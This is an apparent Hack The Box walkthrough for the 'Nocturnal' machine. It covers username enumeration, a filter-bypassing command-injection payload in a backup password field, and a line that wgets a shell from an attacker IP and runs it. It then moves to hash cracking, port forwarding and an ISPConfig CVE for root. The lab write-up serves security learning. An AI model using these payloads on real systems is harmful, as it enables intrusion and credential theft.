# Nocturnal HTB Walkthrough

* **Machine Type**: Linux
* **Solved by**: Akshat Nigam
* **Category**: Web Exploitation, Privilege Escalation
* **Difficulty**: Easy
* **Attack Surface**: Web Interface, Parameter Injection, Intranet Exposure

---

## Port Scan

```
nmap Nocturnal.htb -sV -v

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

## Web Interface

* Register a user, log in.
* Upload a file (e.g., .xlsx). here i have uploaded dangerous.xlsx

* Note the download URL format:

 ```
http://nocturnal.htb/view.php?username=abc&file=dangerous.xlsx
```




## Enumerating Usernames

```
ffuf -w /usr/share/wrodlists/seclists/Usernames/Names/names.txt -u 'http://nocturnal.htb/view.php?username=FUZZ&file=dangerous.xlsx' \
-H 'Cookie: PHPSESSID=r9r2r5mvphpms3nnuk7gbl1i6n' -fs 2985

```

- Found valid users: `admin`, `amanda`, `tobias`
- Amanda's directory contained a file: `privacy.odt`
- File is a zip archive. Extract and find Amanda's password.

## Admin Panel Access
- Log in with Amanda's credentials.
- Create backup with password => Generates `.zip`
- Open BurpSuite capture the request, send it to the Repeater. 


* Filter can be bypassed using:

```
password=%0Abash%09-c%09"id"%0A&backup=
```

* Download remote shell using RFI:

```
password=%0Abash%09-c%09"wget%0910.xx.xx.xx/shell"%0A&backup=
password=%0Abash%09-c%09"bash%09shell"%0A&backup=
```
- Once you get into the shell, look for db file.
```
  nocturnal_database.db
```

- Get Tobias's hash from DB.

```
sqlite3 nocturnal_database.db
```

- Crack successfully to get Tobias's password.

```
john -w=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-Md5

```



## SSH into the system

```
ssh tobias@nocturnal 
```
---

## Privilege Escalation to Root

### Intranet Discovery

```
ss -tulnp
```

* Port 8080 open internally

```
ssh tobias@nocturnal.htb -L 8888:127.0.0.1:8080
```

* Found ISPConfig panel
* Inspect the HTML code of the website
* Likely version: `3.2`

### Exploit Used:

* CVE-2023-46818 - Code Injection in ISPConfig
* GitHub PoC: (https://github.com/ajdumanhug/CVE-2023-46818)

### Root Access

* Exploit or reuse credentials from Amanda/Tobias
* Success: Root shell acquired ✅

---

## Summary

* **User:** Exploited insecure parameter exposure to enumerate valid usernames. Dumped DB backup using Amanda's creds, cracked password hash to get Tobias.

* **Root:** Found local ISPConfig panel over port forwarding. Used public exploit (CVE-2023-46818) or password reuse to gain root access.

> Rooted `Nocturnal` 🌓
